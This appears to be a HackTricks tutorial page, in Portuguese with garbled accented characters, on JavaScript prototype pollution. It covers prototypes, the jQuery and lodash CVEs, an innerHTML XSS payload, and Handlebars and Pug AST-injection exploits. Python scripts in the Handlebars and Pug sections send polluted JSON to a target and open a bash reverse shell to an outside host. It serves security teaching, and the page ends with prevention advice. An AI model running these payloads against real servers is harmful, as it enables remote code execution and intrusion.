# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Objetos em JavaScript <a href="#053a" id="053a"></a>

Primeiramente, precisamos entender `Object` em JavaScript. Um objeto √© simplesmente uma cole√ß√£o de pares de chave e valor, frequentemente chamados de propriedades desse objeto. Por exemplo:

![](<../../../.gitbook/assets/image (389) (1).png>)

Em Javascript, `Object` √© um objeto b√°sico, o modelo para todos os objetos rec√©m-criados. √â poss√≠vel criar um objeto vazio passando `null` para `Object.create`. No entanto, o objeto rec√©m-criado tamb√©m ter√° um tipo que corresponde ao par√¢metro passado e herda todas as propriedades b√°sicas.
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

Anteriormente, aprendemos que um Objeto em javascript √© uma cole√ß√£o de chaves e valores, ent√£o faz sentido que um objeto `null` seja apenas um dicion√°rio vazio: `{}`

## Fun√ß√µes / Classes em Javascript <a href="#55dd" id="55dd"></a>

Em Javascript, os conceitos de classe e fun√ß√£o s√£o bastante inter-relacionados (a pr√≥pria fun√ß√£o atua como construtor para a classe e a natureza real n√£o tem o conceito de "classe" em javascript). Vamos ver o seguinte exemplo:
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
```markdown
![](<../../../.gitbook/assets/image (362).png>)

## Prot√≥tipos em JavaScript <a href="#3843" id="3843"></a>

√â importante notar que o atributo prototype pode ser alterado/modificado/exclu√≠do durante a execu√ß√£o do c√≥digo. Por exemplo, fun√ß√µes podem ser adicionadas dinamicamente √† classe:

![](<../../../.gitbook/assets/image (363).png>)

Fun√ß√µes da classe tamb√©m podem ser modificadas (como `toString` ou `valueOf` nos casos a seguir):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## Heran√ßa

Em um programa baseado em prot√≥tipos, objetos herdam propriedades/m√©todos de classes. As classes s√£o derivadas adicionando propriedades/m√©todos a uma inst√¢ncia de outra classe ou adicionando-os a um objeto vazio.

Note que, se voc√™ adicionar uma propriedade a um objeto que √© usado como prot√≥tipo para um conjunto de objetos (como o myPersonObj), os objetos para os quais ele √© o prot√≥tipo tamb√©m recebem a nova propriedade, mas essa propriedade n√£o √© impressa a menos que seja especificamente chamada.

![](<../../../.gitbook/assets/image (366).png>)

## Polui√ß√£o de \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

Voc√™ j√° deve ter aprendido que **todo objeto em JavaScript √© simplesmente uma cole√ß√£o de pares de chave e valor** e que **todo objeto herda do tipo Object em JavaScript**. Isso significa que, se voc√™ conseguir poluir o tipo Object, **cada objeto JavaScript do ambiente ser√° polu√≠do!**

Isso √© bastante simples, voc√™ s√≥ precisa ser capaz de modificar algumas propriedades (pares de chave-valor) de um objeto JavaScript arbitr√°rio, porque como cada objeto herda de Object, cada objeto pode acessar o esquema de Object.
```
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
Do exemplo anterior, √© poss√≠vel acessar a estrutura do Object usando as seguintes maneiras:
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
Ent√£o, como mencionado anteriormente, se agora uma propriedade for adicionada ao esquema Object, todo objeto JavaScript ter√° acesso √† nova propriedade:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
Agora, cada objeto JS conter√° as novas propriedades: a fun√ß√£o `printHello` e a nova constante `globalconstant`

## polui√ß√£o de prot√≥tipo

Esta t√©cnica n√£o √© t√£o eficaz quanto a anterior, pois voc√™ n√£o pode poluir o esquema do Objeto JS. Mas em casos onde a **palavra-chave `__proto__` √© proibida, esta t√©cnica pode ser √∫til**.

Se voc√™ consegue modificar as propriedades de uma fun√ß√£o, pode modificar a propriedade `prototype` da fun√ß√£o e **cada nova propriedade que voc√™ adicionar aqui ser√° herdada por cada objeto criado a partir dessa fun√ß√£o:**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
Neste caso, apenas os **objetos criados a partir da classe `person`** ser√£o afetados, mas cada um deles agora **herdar√° as propriedades `sayHello` e `newConstant`**.

**Existem 2 maneiras de abusar da polui√ß√£o de prot√≥tipo para envenenar TODOS os objetos JS.**

A primeira seria poluir a propriedade prototype do **Object** (como mencionado anteriormente, todo objeto JS herda deste):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
Se voc√™ conseguir fazer isso, cada objeto JS ser√° capaz de executar a fun√ß√£o `sayBye`.

A outra maneira √© envenenar o prot√≥tipo de um construtor de uma vari√°vel dicion√°rio como no exemplo a seguir:
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
Ap√≥s executar esse c√≥digo, **cada objeto JS poder√° executar a fun√ß√£o `sayHey`**.

## Poluindo outros objetos

### De uma classe para Object.prototype

Em um cen√°rio onde voc√™ pode **poluir um objeto espec√≠fico** e precisa **chegar a `Object.prototype`**, voc√™ pode procur√°-lo com um c√≥digo semelhante ao seguinte:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Polui√ß√£o de elementos de array

Note que, assim como voc√™ pode poluir atributos de objetos em JS, se voc√™ tiver acesso para poluir um array, voc√™ tamb√©m pode **poluir valores do array** acess√≠veis **por √≠ndices** (note que voc√™ n√£o pode sobrescrever valores, ent√£o voc√™ precisa poluir √≠ndices que s√£o de alguma forma usados, mas n√£o escritos).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Polui√ß√£o de elementos HTML

Ao gerar um elemento HTML via JS, √© poss√≠vel **sobrescrever** o atributo **`innerHTML`** para fazer com que ele escreva **c√≥digo HTML arbitr√°rio.** [Ideia e exemplo deste artigo](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemplos

### Exemplo B√°sico

Ent√£o, onde ocorre a polui√ß√£o de prot√≥tipo? Acontece quando h√° um bug na aplica√ß√£o que permite sobrescrever propriedades de `Object.prototype`. Como todo objeto t√≠pico herda suas propriedades de `Object.prototype`, podemos alterar o comportamento da aplica√ß√£o. O exemplo mais comumente mostrado √© o seguinte:
```javascript
if (user.isAdmin) {   // do something important!}
```
Imagine que temos uma polui√ß√£o de prot√≥tipo que torna poss√≠vel definir `Object.prototype.isAdmin = true`. Ent√£o, a menos que a aplica√ß√£o tenha atribu√≠do explicitamente algum valor, `user.isAdmin` √© sempre verdadeiro!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

Por exemplo, `obj[a][b] = value`. Se o atacante pode controlar o valor de `a` e `value`, ent√£o ele s√≥ precisa ajustar o valor de `a` para `__proto__` (em javascript, `obj["__proto__"]` e `obj.__proto__` s√£o completamente equivalentes), ent√£o a propriedade `b` de todos os objetos existentes na aplica√ß√£o ser√° atribu√≠da a `value`.

No entanto, o ataque n√£o √© t√£o simples quanto o acima, de acordo com o [paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), s√≥ podemos atacar quando uma das seguintes tr√™s condi√ß√µes for atendida:

* Realizar merge recursivo
* Defini√ß√£o de propriedade por caminho
* Clonar objeto

### Sobrescrever fun√ß√£o
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Polui√ß√£o de Prot√≥tipo para RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Polui√ß√£o de prot√≥tipo do lado do cliente para XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do jQuery $ .extend

$ .extend, se manipulado incorretamente, pode alterar as propriedades do objeto `prototype` (o modelo dos objetos no aplicativo). Esse atributo aparecer√° ent√£o em todos os objetos. Note que apenas a vers√£o "profunda" (ou seja, g) do $ .extend √© afetada.

Programadores frequentemente usam essa fun√ß√£o para duplicar um objeto ou preencher novas propriedades a partir de um objeto padr√£o. Por exemplo:

Podemos imaginar que `myObject` √© um campo de entrada do usu√°rio e √© serializado no BD)

Neste c√≥digo, costumamos pensar que, ao executar, atribuir√° o atributo `isAdmin` ao objeto rec√©m-criado. Mas essencialmente, ele √© atribu√≠do diretamente a `{}` e ent√£o `{}.isAdmin` ser√° `true`. Se ap√≥s este c√≥digo, realizarmos a seguinte verifica√ß√£o:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
Se o usu√°rio ainda n√£o existir (`undefined`), a propriedade `isAdmin` ser√° procurada em seu objeto pai, que √© o Objeto ao qual foi adicionado `isAdmin` com o valor `true` acima.

Outro exemplo quando executado no JQuery 3.3.1:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
Esses erros podem afetar muitos projetos Javascript, especialmente projetos NodeJS, o exemplo mais pr√°tico √© o erro no Mongoose, a biblioteca JS que ajuda a manipular MongoDB, em dezembro de 2018.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Ataque de polui√ß√£o de prot√≥tipo atrav√©s do lodash

[Lodash](https://www.npmjs.com/package/lodash) √© tamb√©m uma biblioteca bem conhecida que fornece muitas fun√ß√µes diferentes, ajudando-nos a escrever c√≥digo de forma mais conveniente e mais organizada com mais de 19 milh√µes de downloads semanais. E teve o mesmo problema que o JQuery.

**CVE-2018‚Äì3721**

**CVE-2019‚Äì10744**

Este bug afeta todas as vers√µes do Lodash, j√° corrigido na vers√£o 4.17.11.

### Outro tutorial com CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## Polui√ß√£o de Prot√≥tipo AST

No NodeJS, AST √© usado em JS com muita frequ√™ncia, como motores de template e typescript etc.\
Para o motor de template, a estrutura √© como mostrado acima.

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

Informa√ß√µes retiradas de [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

Voc√™ pode inserir qualquer string em `Object.prototype.pendingContent` para determinar a possibilidade de um ataque.\
Isso permite que voc√™ tenha certeza de que servidores est√£o usando o motor handlebars quando existe uma polui√ß√£o de prot√≥tipo em um ambiente de caixa-preta.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
```markdown
Isso √© feito pela fun√ß√£o `appendContent` de `javascript-compiler.js`\
`appendContent` √© assim. Se `pendingContent` estiver presente, anexa ao conte√∫do e retorna.

`pushSource` faz com que o `pendingContent` se torne `undefined`, impedindo que a string seja inserida v√°rias vezes.

**Explora√ß√£o**

![img](https://blog.p6.is/img/2020/08/graph_5.jpg)

Handlebars funciona conforme mostrado no gr√°fico acima.

Ap√≥s o lexer e o parser gerarem a AST, ela √© passada para `compiler.js`\
Podemos executar a fun√ß√£o de template gerada pelo compilador com alguns argumentos. E ela retorna a string como "Hello posix" (quando msg √© posix)
```
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
O analisador no handlebars for√ßa o valor de um n√≥ cujo tipo √© NumberLiteral a ser sempre um n√∫mero atrav√©s do construtor Number. No entanto, voc√™ pode inserir uma string n√£o num√©rica aqui usando a polui√ß√£o de prot√≥tipo.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
Primeiro, observe a fun√ß√£o compile, que suporta duas formas de entrada, Objeto AST e string de template.

quando input.type √© um `Program`, embora o valor de entrada seja na verdade uma string.\
O Parser considera que j√° √© um AST analisado pelo parser.js e o envia para o compilador sem nenhum processamento.
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
O compilador, dado o Objeto AST (na verdade uma string), envia-o para o m√©todo `accept`.\
e `accept` chama `this[node.type]` do Compiler.\
Em seguida, pega o atributo body do AST e o utiliza para construir a fun√ß√£o.
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
Como resultado, um ataque pode ser configurado assim. Se voc√™ passou pelo parser, especifique uma string que n√£o pode ser atribu√≠da ao valor de NumberLiteral. Mas com o AST injetado processado, podemos inserir qualquer c√≥digo na fun√ß√£o.

**Exemplo**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

Mais informa√ß√µes em [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## O que posso fazer para prevenir?

* Congelar propriedades com Object.freeze (Object.prototype)
* Realizar valida√ß√£o nas entradas JSON de acordo com o esquema da aplica√ß√£o
* Evitar o uso de fun√ß√µes de mesclagem recursiva de maneira insegura
* Usar objetos sem propriedades de prot√≥tipo, como `Object.create(null)`, para evitar afetar a cadeia de prot√≥tipos
* Usar `Map` em vez de `Object`
* Atualizar regularmente novos patches para bibliotecas

## Refer√™ncia

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
